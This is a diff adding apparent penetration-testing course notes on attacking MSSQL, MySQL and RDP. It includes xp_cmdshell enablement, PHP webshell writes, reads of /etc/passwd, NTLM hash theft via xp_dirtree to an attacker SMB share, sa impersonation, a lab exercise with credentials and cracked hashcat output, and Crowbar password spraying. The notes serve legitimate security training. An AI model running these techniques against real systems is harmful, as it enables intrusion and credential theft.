@@ -704,3 +704,246 @@ GO
 `Command execution` is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.
 
 `MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:
+- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
+- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
+- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed
+
+To execute commands using SQL syntax on MSSQL, use:
+
+```mysql
+xp_cmdshell 'whoami'
+GO
+```
+
+If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
+
+```mysql
+-- To allow advanced options to be changed.
+EXECUTE sp_configure 'show advanced options', 1 GO
+GO 
+
+-- To update the currently configured value for advanced options. 
+RECONFIGURE 
+GO 
+
+-- To enable the feature. 
+EXECUTE sp_configure 'xp_cmdshell', 1 
+GO
+
+-- To update the currently configured value for this feature. 
+RECONFIGURE 
+GO
+```
+## Write Local Files
+
+`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.
+#### MySQL - Write Local File
+
+```mysql
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
+
+`secure_file_priv` may be set as follows:
+
+- If empty, the variable has no effect, which is not a secure setting.
+- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
+- If set to NULL, the server disables import and export operations.
+
+In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:
+#### MySQL - Secure File Privileges
+
+```mysql
+show variables like "secure_file_priv";
+```
+
+To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:
+#### MSSQL - Enable Ole Automation Procedures
+
+```mysql
+sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+sp_configure 'Ole Automation Procedures', 1
+GO
+RECONFIGURE
+GO
+```
+#### MSSQL - Create a File
+
+```mysql
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+GO
+```
+## Read Local Files
+
+By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
+#### Read Local Files in MSSQL
+
+```mysql
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+GO
+```
+
+As we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
+#### MySQL - Read Local Files in MySQL
+
+```mysql
+select LOAD_FILE("/etc/passwd");
+```
+## Capture MSSQL Service Hash
+
+In the `Attacking SMB` section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.
+
+To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:
+#### XP_DIRTREE Hash Stealing
+
+```mysql
+EXEC master..xp_dirtree '\\10.10.110.17\share\'
+GO
+```
+#### XP_SUBDIRS Hash Stealing
+
+```mysql
+EXEC master..xp_subdirs '\\10.10.110.17\share\'
+GO
+```
+
+If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
+#### XP_SUBDIRS Hash Stealing with Responder
+
+```shell
+sudo responder -I tun0
+```
+#### XP_SUBDIRS Hash Stealing with impacket
+
+```shell
+sudo impacket-smbserver share ./ -smb2support
+```
+## Impersonate Existing Users with MSSQL
+
+SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the `IMPERSONATE` privilege can lead to privilege escalation in SQL Server.
+
+First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:
+
+#### Identify Users that We Can Impersonate
+
+```mysql
+SELECT DISTINCT b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+  ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+GO
+```
+
+To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:
+#### Verifying our Current User and Role
+
+```mysql
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin') 
+go
+```
+
+As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.
+#### Impersonating the SA User
+
+```mysql
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+```
+
+>[!Note]
+>It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.
+
+We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.
+## Communicate with Other Databases with MSSQL
+
+`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
+
+If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.
+#### Identify linked Servers in MSSQL
+
+```mysql
+SELECT srvname, isremote FROM sysservers
+GO
+```
+
+As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.
+
+Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
+
+```mysql
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+GO
+```
+
+>[!Note]
+>If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
+## Exercise
+### What is the password for the "mssqlsvc" user?
+
+```shell
+impacket-mssqlclient htbdbuser:'MSSQLAccess01!'@10.129.21.252
+```
+
+I enumerated the database and didn't find anything important. 
+
+```shell
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+MSSQLSVC::WIN-02:a768a593e08f17cd:d6ee18c06cbf54cb1d22bdebe659a91e:010100000000000080de3d7f0168dd01d2e8b2d877bafb930000000002000800480046005200590001001e00570049004e002d0048003000520042004d0043003100580047003300580004003400570049004e002d0048003000520042004d004300310058004700330058002e0048004600520059002e004c004f00430041004c000300140048004600520059002e004c004f00430041004c000500140048004600520059002e004c004f00430041004c000700080080de3d7f0168dd0106000400020000000800300030000000000000000000000000300000edfa27d08bdb6f19d3f6f36fdaed49b0af73a579fa9901f6beb407da972d0d570a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100300030000000000000000000:princess1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: MSSQLSVC::WIN-02:a768a593e08f17cd:d6ee18c06cbf54cb1...000000
+Time.Started.....: Fri Oct 30 00:12:48 2026 (0 secs)
+Time.Estimated...: Fri Oct 30 00:12:48 2026 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   198.6 kH/s (1.31ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1024/14344385 (0.01%)
+Rejected.........: 0/1024 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> bethany
+Hardware.Mon.#1..: Util: 51%
+```
+
+# Attacking RDP
+
+[Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. It is also one of the most popular administration tools, allowing system administrators to centrally control their remote systems with the same functionality as if they were on-site. In addition, managed service providers (MSPs) often use the tool to manage hundreds of customer networks and systems.
+
+By default, RDP uses port `TCP/3389`. Using `Nmap`, we can identify the available RDP service on the target host:
+
+```shell
+nmap -Pn -p3389 192.168.2.143
+```
+## Misconfigurations
+
+Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.
+
+Using the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service. As an example below, the password `password123` will be tested against a list of usernames in the `usernames.txt` file. The attack found the valid credentials as `administrator` : `password123` on the target RDP host.
+#### Crowbar - RDP Password Spraying
+
+```shell
+crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+```
